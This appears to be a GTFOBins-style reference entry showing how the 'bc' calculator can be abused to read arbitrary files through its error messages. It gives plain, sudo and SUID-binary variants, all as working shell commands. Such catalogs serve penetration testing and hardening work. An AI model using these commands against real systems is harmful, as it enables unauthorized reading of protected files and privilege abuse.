---

description: Display all text data with length greater than one character. Does not display numeric data.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        echo quit | bc -s $LFILE 2>&1 | grep 'multiple letter name' | awk -F '-' '{ printf "%s\n", $2 }'

  sudo:
    - code: |
        LFILE=file_to_read
        echo quit | sudo bc -s $LFILE 2>&1 | grep 'multiple letter name' | awk -F '-' '{ printf "%s\n", $2 }'

  suid:
    - code: |
        sudo install -m =xs $(which bc) .

        LFILE=file_to_read
        echo quit | ./bc -s $LFILE 2>&1 | grep 'multiple letter name' | awk -F '-' '{ printf "%s\n", $2 }'

---
